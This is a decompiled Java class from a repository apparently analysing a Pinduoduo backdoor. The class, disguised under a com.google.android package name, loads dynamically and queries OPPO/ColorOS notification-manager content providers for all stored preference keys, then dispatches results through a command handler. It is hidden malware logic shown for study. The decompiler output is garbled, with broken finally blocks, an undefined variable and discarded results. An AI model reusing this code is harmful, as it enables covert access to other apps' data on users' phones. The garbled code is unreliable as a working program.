package com.google.android.sd.biz_dynamic_dex.oppo_notification_ut;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class OppoNotificationUTExecutor extends DynamicCmdExecutor {
  private String a;
  
  private String b;
  
  private CmdData c;
  
  private void a(Context paramContext) {
    Uri uri = Uri.parse(this.a);
    String str = b(paramContext);
    if (TextUtils.isEmpty("uid")) {
      str = "get uid fail";
    } else {
      try {
        Cursor cursor = paramContext.getContentResolver().query(uri, null, null, new String[] { "any", "__key_all__", "any" }, null);
      } finally {
        str = null;
      } 
    } 
    a(paramContext, str);
  }
  
  private void a(Context paramContext, String paramString) {
    try {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(this.c, paramString, null));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private String b(Context paramContext) {
    try {
      return String.valueOf(i);
    } finally {
      paramContext = null;
    } 
  }
  
  public void realExecute(Context paramContext, String paramString) {
    try {
      JSONObject jSONObject = new JSONObject(paramString);
      boolean bool = TextUtils.isEmpty(paramString);
      if (bool)
        return; 
      try {
        this.b = (new JSONObject(paramString)).optString("pkg_name");
      } finally {
        Exception exception;
      } 
      this.c = new CmdData(3015, jSONObject.optString("uuid"), "client", paramString);
      if (TextUtils.isEmpty(this.b))
        return; 
      if (Build.VERSION.SDK_INT < 30)
        return; 
      try {
        if (paramContext.getPackageManager().getPackageInfo("com.coloros.notificationmanager", 128) != null)
          this.a = "content://com.coloros.notificationmanager.shared_preference"; 
      } finally {}
      try {
        if (paramContext.getPackageManager().getPackageInfo("com.oplus.notificationmanager", 128) != null)
          this.a = "content://com.oplus.notificationmanager.shared_preference"; 
      } finally {}
      return;
    } finally {
      paramString = null;
      a(paramContext, "throwable: ".concat(String.valueOf(paramString)));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\67c9e686004f45158e94002e8e781192-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_notification_ut\OppoNotificationUTExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */